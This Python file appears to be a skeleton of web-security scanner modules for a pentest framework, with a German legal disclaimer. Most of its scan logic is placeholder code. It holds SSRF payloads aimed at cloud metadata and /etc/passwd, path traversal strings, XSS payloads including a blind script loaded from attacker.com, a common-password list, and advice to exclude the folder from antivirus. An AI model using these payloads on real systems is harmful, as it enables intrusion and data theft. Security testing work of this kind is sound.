#!/usr/bin/env python3
"""
================================================================================
Recommended Web Application Security Modules for Zen-AI-Pentest Framework
================================================================================

⚠️  EDUCATIONAL / PROOF OF CONCEPT / SECURITY RESEARCH  ⚠️

Diese Datei enthält Sicherheitsmodule für autorisierte Penetrationstests
und dient ausschließlich zu Bildungszwecken.

================================================================================
LEGAL DISCLAIMER / RECHTLICHER HAFTUNGSAUSSCHLUSS
================================================================================

ERLAUBTE VERWENDUNG:
✅ Autorisierte Penetrationstests mit schriftlicher Genehmigung
✅ Sicherheitsbewertungen eigener Systeme
✅ Sicherheitsforschung in isolierten Testumgebungen
✅ Bildungszwecke in kontrollierten Lernumgebungen

VERBOTENE VERWENDUNG:
❌ Unautorisierte Zugriffe auf fremde Systeme (Hacking)
❌ Datenbeschaffung ohne ausdrückliche Einwilligung
❌ Aktivitäten, die Datenschutzverletzungen verursachen
❌ Jegliche Aktivitäten, die rechtliche Konsequenzen nach sich ziehen

HAFTUNGSAUSSCHLUSS:
Der Autor übernimmt KEINE HAFTUNG für Schäden, die durch Missbrauch
oder illegale Verwendung dieser Software entstehen.

Verwendung erfolgt AUSSCHLIEßLICH auf eigene Gefahr und Verantwortung!

================================================================================
BESCHREIBUNG
================================================================================

Diese Module implementieren Sicherheitstests basierend auf der OWASP Top 10:

1. CSRF Scanner (Critical)       - Cross-Site Request Forgery Detection
2. SSRF Scanner (Critical)       - Server-Side Request Forgery Detection
3. Access Control Scanner (Crit) - IDOR, Path Traversal Detection
4. Authentication Tester (High)  - Brute Force, Password Policy Tests
5. Session Manager (High)        - Session Security Testing
6. XSS Scanner Enhanced (Medium) - Cross-Site Scripting Detection
7. API Security Scanner (Medium) - REST/GraphQL API Testing
8. File Upload Tester (Low)      - Malicious File Upload Detection

================================================================================
SICHERHEITSHINWEIS FÜR ANTI-VIRUS SOFTWARE
================================================================================

Diese Datei enthält Sicherheitstest-Payloads, die von einigen Anti-Virus
Programmen als bösartig erkannt werden können. Dies ist ein FALSE POSITIVE.

Die Payloads sind NOTWENDIG für:
- Validierung von Sicherheitskontrollen
- Penetrationstests
- Sicherheitsforschung

Empfohlene Maßnahmen:
1. Fügen Sie das Zen-AI-Pentest Verzeichnis zu AV-Ausschlüssen hinzu
2. Verwenden Sie eine isolierte VM für Sicherheitstests
3. Nutzen Sie die Docker-Version des Frameworks

================================================================================
BASIS: OWASP TOP 10 COVERAGE
================================================================================

A01:2021 - Broken Access Control       → Module 3
A02:2021 - Cryptographic Failures      → Module 4, 5
A03:2021 - Injection                   → Module 2, 6
A04:2021 - Insecure Design             → Module 1, 4
A05:2021 - Security Misconfiguration   → Module 7
A06:2021 - Vulnerable Components       → Module 7
A07:2021 - ID and Auth Failures        → Module 4, 5
A08:2021 - Software Integrity Failures → Module 8
A09:2021 - Logging Failures            → Module 4
A10:2021 - SSRF                        → Module 2

================================================================================
"""

from dataclasses import dataclass
from typing import Dict, List
import re
import asyncio


# ============================================================================
# 1. CSRF SCANNER MODULE (CRITICAL PRIORITY)
# ============================================================================

@dataclass
class CSRFScanResult:
    """CSRF Scan Result"""
    url: str
    vulnerable: bool
    missing_protections: List[str]
    token_patterns_found: List[str]
    recommendations: List[str]


class CSRFScanner:
    """
    CSRF (Cross-Site Request Forgery) Detection Module

    Tests for:
    - Token presence and validation
    - SameSite cookie attribute
    - Referer/Origin header validation
    - Custom header validation
    - Double-submit cookie pattern

    EDUCATIONAL USE ONLY - For authorized security testing
    """

    TOKEN_PATTERNS = [
        r'csrf[_-]?token',
        r'xsrf[_-]?token',
        r'[_-]token',
        r'authenticity[_-]?token',
        r'__RequestVerificationToken',
        r'csrfmiddlewaretoken'
    ]

    async def scan_form(self, url: str, form_data: Dict) -> CSRFScanResult:
        """Scan a form for CSRF protection"""
        result = CSRFScanResult(
            url=url,
            vulnerable=False,
            missing_protections=[],
            token_patterns_found=[],
            recommendations=[]
        )

        # Check 1: Token presence
        has_token = any(
            re.search(pattern, str(form_data), re.I)
            for pattern in self.TOKEN_PATTERNS
        )

        if has_token:
            result.token_patterns_found = [
                p for p in self.TOKEN_PATTERNS
                if re.search(p, str(form_data), re.I)
            ]
        else:
            result.missing_protections.append('CSRF Token')

        # Check 2: SameSite cookie attribute
        cookies = await self.get_cookies(url)
        samesite_missing = any(
            'samesite' not in cookie.lower()
            for cookie in cookies
        )

        if samesite_missing:
            result.missing_protections.append('SameSite Cookie')

        # Check 3: Referer/Origin validation
        referer_check = await self.test_referer_validation(url)
        if not referer_check:
            result.missing_protections.append('Referer Validation')

        # Check 4: Custom headers
        custom_headers = await self.test_custom_headers(url)
        if not custom_headers:
            result.missing_protections.append('Custom Header Validation')

        # Determine vulnerability
        if result.missing_protections:
            result.vulnerable = True
            result.recommendations = self._generate_recommendations(result.missing_protections)

        return result

    async def get_cookies(self, url: str) -> List[str]:
        """Get cookies from URL"""
        # Implementation placeholder
        return []

    async def test_referer_validation(self, url: str) -> bool:
        """Test if endpoint validates Referer/Origin header"""
        # Implementation placeholder
        return True

    async def test_custom_headers(self, url: str) -> bool:
        """Test for X-Requested-With or custom header validation"""
        # Implementation placeholder
        return True

    def _generate_recommendations(self, missing: List[str]) -> List[str]:
        """Generate recommendations based on missing protections"""
        recommendations = []
        if 'CSRF Token' in missing:
            recommendations.append("Implement anti-CSRF tokens in all state-changing forms")
        if 'SameSite Cookie' in missing:
            recommendations.append("Set SameSite=Strict or SameSite=Lax on session cookies")
        if 'Referer Validation' in missing:
            recommendations.append("Validate Referer/Origin headers on sensitive endpoints")
        if 'Custom Header Validation' in missing:
            recommendations.append("Require custom headers (X-Requested-With) for AJAX requests")
        return recommendations


# ============================================================================
# 2. SSRF SCANNER MODULE (CRITICAL PRIORITY)
# ============================================================================

@dataclass
class SSRFScanResult:
    """SSRF Scan Result"""
    url: str
    parameter: str
    vulnerable: bool
    payloads_tested: List[str]
    successful_payloads: List[str]
    evidence: str
    severity: str = "High"


class SSRFScanner:
    """
    Server-Side Request Forgery (SSRF) Detection Module

    Tests for:
    - Internal network access attempts
    - Cloud metadata access attempts
    - File protocol access attempts
    - URL parsing bypasses

    EDUCATIONAL USE ONLY - For authorized security testing
    """

    # EDUCATIONAL: Test payloads for SSRF detection
    # These are used to TEST if applications properly validate URLs
    PAYLOADS = {
        'internal_network': [
            'http://127.0.0.1:22/',
            'http://localhost:22/',
            'http://[::]:22/',
            'http://[::1]:22/',
            'http://0.0.0.0:22/',
            'http://0177.0.0.01/',
            'http://2130706433/',  # Decimal IP
            'http://0x7f.0x0.0x0.0x1/',
        ],
        'cloud_metadata': [
            'http://169.254.169.254/latest/meta-data/',  # AWS
            'http://169.254.169.254/metadata/v1/',        # DigitalOcean
            'http://169.254.169.254/computeMetadata/v1/', # GCP
            'http://169.254.169.254/metadata/instance/',  # Azure
        ],
        'file_protocol': [
            'file:///etc/passwd',
            'file:///etc/hosts',
            'file:///proc/self/environ',
            'file:///windows/win.ini',
        ],
        'bypass_techniques': [
            'http://evil.com@127.0.0.1',
            'http://127.0.0.1#@evil.com',
            'http://127.0.0.1?@evil.com',
            'http://127.0.0.1%00@evil.com',
        ]
    }

    async def scan_parameter(self, url: str, param: str) -> List[SSRFScanResult]:
        """Scan a parameter for SSRF vulnerability"""
        results = []

        for category, payloads in self.PAYLOADS.items():
            for payload in payloads:
                result = await self.test_payload(url, param, payload, category)
                if result.vulnerable:
                    results.append(result)

        return results

    async def test_payload(self, url: str, param: str, payload: str, category: str) -> SSRFScanResult:
        """Test a single SSRF payload"""
        # Implementation placeholder - educational only
        return SSRFScanResult(
            url=url,
            parameter=param,
            vulnerable=False,
            payloads_tested=[payload],
            successful_payloads=[],
            evidence=""
        )


# ============================================================================
# 3. ACCESS CONTROL SCANNER MODULE (CRITICAL PRIORITY)
# ============================================================================

@dataclass
class IDORFinding:
    """IDOR Finding"""
    url: str
    parameter: str
    original_value: str
    modified_value: str
    vulnerable: bool
    evidence: str


class AccessControlScanner:
    """
    Access Control Security Testing Module

    Tests for:
    - IDOR (Insecure Direct Object Reference)
    - Path Traversal
    - Mass Assignment
    - Function Level Access Control

    EDUCATIONAL USE ONLY - For authorized security testing
    """

    IDOR_PATTERNS = [
        r'[?&](id|user_id|account_id|order_id|doc_id)=\d+',
        r'[?&](file|document|report)=[^&]+',
        r'/api/v\d+/(users|orders|documents|accounts)/\d+',
    ]

    # EDUCATIONAL: Path traversal test payloads
    # Used to test if applications properly sanitize file paths
    PATH_TRAVERSAL_PAYLOADS = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\win.ini',
        '....//....//....//etc/passwd',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
        '..%252f..%252f..%252fetc%252fpasswd',
    ]

    async def scan_for_idor(self, url: str) -> List[IDORFinding]:
        """Scan URL for IDOR vulnerabilities"""
        findings = []

        # Find potential IDOR parameters
        for pattern in self.IDOR_PATTERNS:
            matches = re.findall(pattern, url)
            for match in matches:
                # Test with modified values
                test_values = ['1', '2', '999999', '0', '-1']
                for test_value in test_values:
                    finding = await self.test_idor(url, match, test_value)
                    if finding.vulnerable:
                        findings.append(finding)

        return findings

    async def test_path_traversal(self, url: str) -> List[Dict]:
        """Test for path traversal vulnerabilities"""
        results = []

        for payload in self.PATH_TRAVERSAL_PAYLOADS:
            # Implementation placeholder - educational only
            pass

        return results

    async def test_mass_assignment(self, url: str, params: Dict) -> List[Dict]:
        """Test for mass assignment vulnerabilities"""
        dangerous_params = [
            'is_admin', 'admin', 'role', 'privilege',
            'user_type', 'account_type', 'permissions'
        ]

        results = []
        for param in dangerous_params:
            # Test if parameter is accepted
            pass

        return results

    async def test_idor(self, url: str, match: str, test_value: str) -> IDORFinding:
        """Test for IDOR with modified value"""
        # Implementation placeholder
        return IDORFinding(
            url=url,
            parameter="id",
            original_value=match,
            modified_value=test_value,
            vulnerable=False,
            evidence=""
        )


# ============================================================================
# 4. AUTHENTICATION TESTER MODULE (HIGH PRIORITY)
# ============================================================================

@dataclass
class AuthTestResult:
    """Authentication Test Result"""
    test_type: str
    vulnerable: bool
    details: Dict
    recommendations: List[str]


class AuthenticationTester:
    """
    Authentication Security Testing Module

    Tests for:
    - Brute force protection
    - Account lockout
    - Credential stuffing
    - Password policy
    - MFA bypass

    EDUCATIONAL USE ONLY - For authorized security testing
    """

    COMMON_PASSWORDS = [
        'password', '123456', 'admin', 'letmein',
        'welcome', 'monkey', 'dragon', 'master'
    ]

    async def test_brute_force_protection(self, login_url: str, username: str) -> AuthTestResult:
        """Test for brute force protection mechanisms"""
        results = {
            'rate_limiting': False,
            'account_lockout': False,
            'captcha_triggered': False,
            'ip_blocking': False
        }

        # Attempt multiple failed logins
        for i in range(20):
            # Implementation placeholder - educational only
            pass

        return AuthTestResult(
            test_type='brute_force_protection',
            vulnerable=not any(results.values()),
            details=results,
            recommendations=[]
        )

    async def test_password_policy(self, register_url: str) -> AuthTestResult:
        """Test password policy enforcement"""
        test_passwords = [
            ('short', '123'),
            ('common', 'password123'),
            ('nocomplex', 'abcdefgh'),
            ('valid', 'Str0ng!P@ssw0rd')
        ]

        results = {}
        for test_name, password in test_passwords:
            # Implementation placeholder - educational only
            pass

        return AuthTestResult(
            test_type='password_policy',
            vulnerable=False,
            details=results,
            recommendations=[]
        )

    async def test_mfa_bypass(self, mfa_url: str) -> AuthTestResult:
        """Test MFA bypass techniques"""
        bypass_techniques = [
            'response_manipulation',
            'brute_force_otp',
            'backup_code_reuse',
            'session_fixation'
        ]

        # Implementation placeholder
        return AuthTestResult(
            test_type='mfa_bypass',
            vulnerable=False,
            details={},
            recommendations=['Implement rate limiting on MFA endpoints']
        )


# ============================================================================
# 5. SESSION MANAGER MODULE (HIGH PRIORITY)
# ============================================================================

@dataclass
class SessionTestResult:
    """Session Security Test Result"""
    test_name: str
    passed: bool
    findings: List[str]
    recommendations: List[str]


class SessionManager:
    """
    Session Management Security Testing Module

    Tests for:
    - Session ID entropy
    - Session fixation
    - Session hijacking
    - Session timeout
    - Cookie security flags

    EDUCATIONAL USE ONLY - For authorized security testing
    """

    async def test_session_id_entropy(self, session_ids: List[str]) -> SessionTestResult:
        """Test session ID randomness"""
        # Calculate entropy
        entropy = self._calculate_entropy(session_ids)

        # Check for patterns
        patterns = self._detect_patterns(session_ids)

        return SessionTestResult(
            test_name='session_id_entropy',
            passed=entropy >= 3.0 and not patterns,
            findings=[f'Entropy score: {entropy}'] if patterns else [],
            recommendations=['Use cryptographically secure random generation']
        )

    async def test_session_fixation(self, login_url: str) -> SessionTestResult:
        """Test for session fixation vulnerability"""
        # Step 1: Get session ID before login
        # Step 2: Login
        # Step 3: Check if session ID changed

        return SessionTestResult(
            test_name='session_fixation',
            passed=True,
            findings=[],
            recommendations=['Regenerate session ID after authentication']
        )

    async def test_cookie_security_flags(self, url: str) -> SessionTestResult:
        """Test cookie security flags"""
        flags_to_check = ['HttpOnly', 'Secure', 'SameSite']

        # Implementation placeholder
        return SessionTestResult(
            test_name='cookie_security_flags',
            passed=True,
            findings=[],
            recommendations=[]
        )

    def _calculate_entropy(self, data: List[str]) -> float:
        """Calculate Shannon entropy"""
        import math
        from collections import Counter

        if not data:
            return 0.0

        counter = Counter(data)
        length = len(data)
        entropy = -sum(
            (count / length) * math.log2(count / length)
            for count in counter.values()
        )
        return entropy

    def _detect_patterns(self, session_ids: List[str]) -> List[str]:
        """Detect patterns in session IDs"""
        patterns = []

        # Check for sequential patterns
        # Check for timestamp patterns
        # Check for encoding patterns

        return patterns


# ============================================================================
# 6. XSS SCANNER ENHANCEMENT MODULE (MEDIUM PRIORITY)
# ============================================================================

class XSSScannerEnhanced:
    """
    Enhanced XSS Scanner with DOM-based detection

    EDUCATIONAL USE ONLY - For authorized security testing
    """

    # EDUCATIONAL: XSS test payloads for security testing
    # These are used to TEST if applications properly sanitize user input
    PAYLOAD_CATEGORIES = {
        'reflected': [
            '<script>alert(1)</script>',
            '<img src=x onerror=alert(1)>',
            '<svg onload=alert(1)>',
            'javascript:alert(1)',
        ],
        'stored': [
            '<script>alert(1)</script>',
            "<img src='x' onerror='alert(1)'>",
        ],
        'dom_based': [
            '#<img src=x onerror=alert(1)>',
            'javascript:alert(1)//',
        ],
        'blind': [
            '<script src="https://attacker.com/xss.js"></script>',
        ]
    }

    CONTEXT_PAYLOADS = {
        'html': [
            '<script>alert(1)</script>',
            '<img src=x onerror=alert(1)>',
            '<svg onload=alert(1)>',
            '<body onload=alert(1)>',
        ],
        'attribute': [
            '" onmouseover=alert(1) "',
            "' onfocus=alert(1) autofocus '",
            '" onerror=alert(1) "',
        ],
        'javascript': [
            "';alert(1);//",
            "${alert(1)}",
            "\';alert(1);//",
        ],
        'url': [
            'javascript:alert(1)',
            'data:text/html,<script>alert(1)</script>',
            'vbscript:msgbox(1)',
        ],
        'template': [
            '{{7*7}}',
            '${7*7}',
            '<%= 7*7 %>',
            '${{7*7}}',
        ]
    }

    WAF_BYPASS_TECHNIQUES = [
        'case_randomization',
        'html_encoding',
        'url_encoding',
        'unicode_normalization',
        'comment_obfuscation',
        'null_byte_insertion',
    ]

    async def scan_for_xss(self, url: str, params: Dict[str, str]) -> List[Dict]:
        """Comprehensive XSS scan"""
        findings = []

        # Test each parameter with each payload category
        for param_name, param_value in params.items():
            for category, payloads in self.PAYLOAD_CATEGORIES.items():
                for payload in payloads:
                    result = await self.test_xss_payload(url, param_name, payload, category)
                    if result.get('vulnerable'):
                        findings.append(result)

        return findings

    async def test_xss_payload(self, url: str, param: str, payload: str, category: str) -> Dict:
        """Test a single XSS payload"""
        # Implementation placeholder - educational only
        return {
            'vulnerable': False,
            'url': url,
            'parameter': param,
            'payload': payload,
            'category': category
        }


# ============================================================================
# 7. API SECURITY SCANNER MODULE (MEDIUM PRIORITY)
# ============================================================================

class APISecurityScanner:
    """
    API Security Testing Module for REST and GraphQL APIs

    EDUCATIONAL USE ONLY - For authorized security testing
    """

    REST_TESTS = [
        'authentication',
        'authorization',
        'input_validation',
        'rate_limiting',
        'error_handling',
        'cors_policy',
        'versioning',
    ]

    GRAPHQL_TESTS = [
        'introspection',
        'query_depth',
        'query_complexity',
        'batch_queries',
        'field_suggestions',
    ]

    async def scan_rest_api(self, base_url: str, endpoints: List[str]) -> List[Dict]:
        """Scan REST API endpoints"""
        results = []

        for endpoint in endpoints:
            # Test authentication
            # Test authorization
            # Test input validation
            pass

        return results

    async def scan_graphql_api(self, endpoint: str) -> List[Dict]:
        """Scan GraphQL API endpoint"""
        # Test introspection
        # Test query depth
        # Test batching
        pass


# ============================================================================
# 8. FILE UPLOAD TESTER MODULE (LOW PRIORITY)
# ============================================================================

class FileUploadTester:
    """
    File Upload Security Testing Module

    EDUCATIONAL USE ONLY - For authorized security testing
    """

    DANGEROUS_EXTENSIONS = [
        '.php', '.jsp', '.asp', '.aspx', '.py',
        '.rb', '.pl', '.cgi', '.sh', '.exe',
        '.dll', '.bat', '.cmd', '.com'
    ]

    BYPASS_TECHNIQUES = [
        'double_extension',
        'null_byte',
        'case_variation',
        'alternate_data_stream',
        'mime_type_spoofing',
    ]

    # EDUCATIONAL: Test file contents for upload testing
    # These are SAFE test patterns used to check upload validation
    TEST_FILES = {
        'php_test': ('test.php', b'<?php /* EDUCATIONAL TEST PAYLOAD */ ?>'),
        'jsp_test': ('test.jsp', b'<% /* EDUCATIONAL TEST PAYLOAD */ %>'),
        'html_test': ('test.html', b'<script>/* EDUCATIONAL TEST */</script>'),
    }

    async def test_file_upload(self, upload_url: str, field_name: str) -> List[Dict]:
        """Test file upload functionality"""
        results = []

        # Test dangerous extensions
        for ext in self.DANGEROUS_EXTENSIONS:
            pass

        # Test bypass techniques
        for technique in self.BYPASS_TECHNIQUES:
            pass

        return results


# ============================================================================
# USAGE EXAMPLE
# ============================================================================

async def main():
    """Example usage of recommended modules"""

    print("=" * 80)
    print("Zen-AI-Pentest Security Modules - EDUCATIONAL USE ONLY")
    print("=" * 80)
    print("\n⚠️  WARNUNG: Diese Module sind für autorisierte Sicherheitstests!")
    print("   Unautorisierte Verwendung ist ILLEGAL.\n")
    print("=" * 80)

    # CSRF Scanner
    csrf_scanner = CSRFScanner()
    # csrf_result = await csrf_scanner.scan_form("https://example.com/login", {})

    # SSRF Scanner
    ssrf_scanner = SSRFScanner()
    # ssrf_results = await ssrf_scanner.scan_parameter("https://example.com/fetch", "url")

    # Access Control Scanner
    access_scanner = AccessControlScanner()
    # idor_findings = await access_scanner.scan_for_idor("https://example.com/api/users/123")

    # Authentication Tester
    auth_tester = AuthenticationTester()
    # brute_force_result = await auth_tester.test_brute_force_protection("https://example.com/login", "admin")

    # Session Manager
    session_manager = SessionManager()
    # entropy_result = await session_manager.test_session_id_entropy(["session1", "session2"])

    print("\n✅ Recommended modules loaded successfully!")
    print("\nVerfügbare Module:")
    print("  1. CSRFScanner          - Cross-Site Request Forgery Detection")
    print("  2. SSRFScanner          - Server-Side Request Forgery Detection")
    print("  3. AccessControlScanner - IDOR & Path Traversal Detection")
    print("  4. AuthenticationTester - Brute Force & Password Policy Tests")
    print("  5. SessionManager       - Session Security Testing")
    print("  6. XSSScannerEnhanced   - Cross-Site Scripting Detection")
    print("  7. APISecurityScanner   - REST/GraphQL API Testing")
    print("  8. FileUploadTester     - Malicious File Upload Detection")

    print("\n" + "=" * 80)
    print("LEGAL DISCLAIMER:")
    print("Diese Module sind ausschließlich für autorisierte Sicherheitstests")
    print("und Bildungszwecke bestimmt. Der Autor übernimmt keine Haftung für")
    print("Missbrauch oder illegale Verwendung.")
    print("=" * 80)


if __name__ == "__main__":
    asyncio.run(main())
